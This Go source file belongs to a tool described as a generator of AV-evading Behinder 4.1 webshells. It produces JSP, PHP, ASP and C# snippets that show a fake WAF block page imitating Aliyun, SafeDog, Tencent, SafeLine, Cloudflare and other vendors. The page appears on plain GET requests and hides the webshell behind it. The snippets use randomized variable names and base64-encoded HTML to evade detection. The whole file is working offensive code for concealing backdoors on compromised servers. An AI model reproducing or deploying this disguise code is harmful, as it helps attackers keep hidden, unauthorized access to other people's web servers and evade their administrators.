// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package waf

import (
	"encoding/base64"
	"Zack-BypassWeb/pkg/utils"
	"strings"
)

// randHex returns n random hex digits (0-9).
func randHex(n int) string {
	var b strings.Builder
	for i := 0; i < n; i++ {
		b.WriteByte(byte('0' + utils.RandInt(0, 9)))
	}
	return b.String()
}

// WAFPage represents a fake WAF block page.
type WAFPage struct {
	Name string
	HTML string
}

// GetWAFPages returns all available WAF imitation pages.
func GetWAFPages() []WAFPage {
	return []WAFPage{
		{Name: "aliyun", HTML: aliyunHTML},
		{Name: "safedog", HTML: safedogHTML},
		{Name: "tencent", HTML: tencentHTML},
		{Name: "safeline", HTML: safelineHTML},
		{Name: "anyu", HTML: anyuHTML},
		{Name: "wangsu", HTML: wangsuHTML},
		{Name: "baidu", HTML: baiduHTML},
		{Name: "cloudflare", HTML: cloudflareHTML},
	}
}

// WAFDisguise generates WAF disguise code for each language.
type WAFDisguise struct {
	Lang string
}

// NewWAFDisguise creates a WAF disguise generator.
func NewWAFDisguise(lang string) *WAFDisguise {
	return &WAFDisguise{Lang: lang}
}

// Generate generates the WAF disguise code for a given WAF name.
func (wd *WAFDisguise) Generate(wafName string) string {
	var htmlB64 string
	for _, page := range GetWAFPages() {
		if page.Name == wafName {
			htmlB64 = base64.StdEncoding.EncodeToString([]byte(page.HTML))
			break
		}
	}
	if htmlB64 == "" {
		return ""
	}

	switch wd.Lang {
	case "jsp":
		return wd.genJava(htmlB64, "200")
	case "php":
		return wd.genPHP(htmlB64)
	case "asp":
		return wd.genASP(htmlB64)
	case "aspx", "ashx":
		return wd.genCS(htmlB64)
	case "jspx":
		return wd.genJava(htmlB64, "200")
	default:
		return ""
	}
}

// genJava generates JSP WAF disguise code.
// Uses request.getMethod() check instead of getReader().read() to avoid consuming POST body.
func (wd *WAFDisguise) genJava(htmlB64, httpCode string) string {
	htmlVar := utils.RandString(6)
	decodeVar := utils.RandString(5)
	exVar := utils.RandString(5)

	return strings.NewReplacer(
		"@HTML_VAR@", htmlVar,
		"@HTML_B64@", htmlB64,
		"@DECODE_VAR@", decodeVar,
		"@EX_VAR@", exVar,
		"@CODE@", httpCode,
	).Replace(`if (!"POST".equals(request.getMethod()) && request.getParameterMap().size() == 0) {
    response.setContentType("text/html; charset=UTF-8");
	    response.setStatus(@CODE@);
    String @HTML_VAR@ = "@HTML_B64@";
    byte[] @DECODE_VAR@ = null;
    try {
        Class b64cls = Class.forName("java.util.Base64");
        Object dec = b64cls.getMethod("getDecoder").invoke(null);
        @DECODE_VAR@ = (byte[]) dec.getClass().getMethod("decode", String.class).invoke(dec, @HTML_VAR@);
    } catch (Exception @EX_VAR@) {
        try {
            Class tcCls = Class.forName("org.apache.tomcat.util.codec.binary.Base64");
            @DECODE_VAR@ = (byte[]) tcCls.getMethod("decodeBase64", String.class).invoke(null, @HTML_VAR@);
        } catch (Exception @EX_VAR@2) {
            @DECODE_VAR@ = (byte[]) Class.forName("sun.misc.BASE64Decoder").getMethod("decodeBuffer", String.class).invoke(Class.forName("sun.misc.BASE64Decoder").newInstance(), @HTML_VAR@);
        }
    }
    out.println(new String(@DECODE_VAR@, "UTF-8"));
    return;
}`)
}

// genPHP generates PHP WAF disguise code.
// Uses $_SERVER['REQUEST_METHOD'] check to avoid consuming php://input body.
func (wd *WAFDisguise) genPHP(htmlB64 string) string {
	v1 := "$" + utils.RandString(5)

	return strings.NewReplacer(
		"@V1@", v1,
		"@HTML@", htmlB64,
	).Replace(`@V1@ = "@HTML@";
if ($_SERVER['REQUEST_METHOD'] !== 'POST' && count($_REQUEST) == 0) {
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(200);
    echo base64_decode(@V1@);
    exit();
}`)
}

func (wd *WAFDisguise) genASP(htmlB64 string) string {
	v1 := utils.RandString(6)
	v2 := utils.RandString(5)

	return strings.NewReplacer(
		"@V1@", v1,
		"@V2@", v2,
		"@HTML@", htmlB64,
	).Replace(`Function @V1@(base64String)
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("temp")
    node.dataType = "bin.base64"
    node.text = base64String
    binaryData = node.nodeTypedValue
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 : stream.Open : stream.Write binaryData
    stream.Position = 0 : stream.Type = 2
    stream.Charset = "UTF-8"
    @V1@ = stream.ReadText : stream.Close
    Set stream = Nothing : Set node = Nothing : Set xml = Nothing
End Function
If Request.TotalBytes = 0 And Request.QueryString.Count = 0 Then
    Response.ContentType = "text/html; charset=UTF-8"
    Response.CodePage = 65001
    @V2@ = @V1@("@HTML@")
    Response.Write(@V2@)
    Response.End()
End If`)
}

func (wd *WAFDisguise) genCS(htmlB64 string) string {
	v1 := utils.RandString(5)
	v2 := utils.RandString(6)

	return strings.NewReplacer(
		"@V1@", v1,
		"@V2@", v2,
		"@HTML@", htmlB64,
	).Replace(`if (HttpContext.Current.Request.HttpMethod == "GET" && HttpContext.Current.Request.QueryString.Count == 0 && HttpContext.Current.Request.Form.Count == 0) {
    HttpContext.Current.Response.StatusCode = 200;
    string @V1@ = "@HTML@";
    byte[] @V2@ = System.Convert.FromBase64String(@V1@);
    HttpContext.Current.Response.Write(System.Text.Encoding.UTF8.GetString(@V2@));
    HttpContext.Current.Response.End();
}`)
}

// ============================================
// Embedded WAF page HTML templates
// ============================================

var aliyunHTML = `<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>405 Not Allowed</title>
    <style>
        html,body,div,a,h2,p{margin:0;padding:0;font-family:"Microsoft YaHei"}
        a{text-decoration:none;color:#3b6ea3}
        .container{width:1000px;margin:auto;color:#696969}
        .header{padding:50px 0}
        .header .message{height:36px;padding-left:120px;line-height:36px}
        .main{padding:50px 0;background:#f4f5f7}
        .footer{margin-top:30px;text-align:right}
    </style>
</head>
<body>
    <div class="header">
        <div class="container">
            <div class="message">
                Sorry, the request is blocked by Web Application Firewall.
            </div>
        </div>
    </div>
    <div class="main">
        <div class="container">
            <p>Your request has been blocked due to security policy.</p>
        </div>
    </div>
    <div class="footer">
        <div class="container">
            <span>Request ID: ` + randHex(16) + `</span>
        </div>
    </div>
</body>
</html>`

var safedogHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>405 Not Allowed</title>
</head>
<body>
    <center><h1>405 Not Allowed</h1></center>
    <hr />
    <center>SafeDog WAF</center>
</body>
</html>`

var tencentHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>403 Forbidden</title>
    <style>body{font-family:Arial,sans-serif;margin:40px;text-align:center}h1{color:#333}</style>
</head>
<body>
    <h1>403 Forbidden</h1>
    <p>The request was rejected by the Web Application Firewall.</p>
    <p style="color:#999;font-size:12px">Tencent Cloud WAF</p>
</body>
</html>`

var safelineHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Request Blocked</title>
    <style>body{background:#f5f5f5;font-family:Arial;text-align:center;padding-top:100px}</style>
</head>
<body>
    <h1>Request Blocked</h1>
    <p>Your request has been blocked by SafeLine Web Application Firewall.</p>
    <p style="color:#aaa;font-size:12px">Chaitin SafeLine</p>
</body>
</html>`

var anyuHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>403 Forbidden</title>
</head>
<body>
    <center><h1>403 Forbidden</h1></center>
    <hr />
    <center>AnYu WAF</center>
</body>
</html>`

var wangsuHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Access Denied</title>
    <style>body{font-family:sans-serif;margin:50px}h1{color:#c00}</style>
</head>
<body>
    <h1>Access Denied</h1>
    <p>The requested URL was rejected by Wangsu CDN WAF.</p>
</body>
</html>`

var baiduHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>403 Forbidden</title>
    <style>body{margin:40px;font-family:sans-serif;background:#fff}</style>
</head>
<body>
    <h1>403 Forbidden</h1>
    <p>Request forbidden by Baidu Cloud WAF.</p>
</body>
</html>`

var cloudflareHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Attention Required! | Cloudflare</title>
    <style>body{font-family:Arial;margin:2em;text-align:center}</style>
</head>
<body>
    <h1>Attention Required!</h1>
    <p>Cloudflare Ray ID: ` + randHex(16) + `</p>
</body>
</html>`
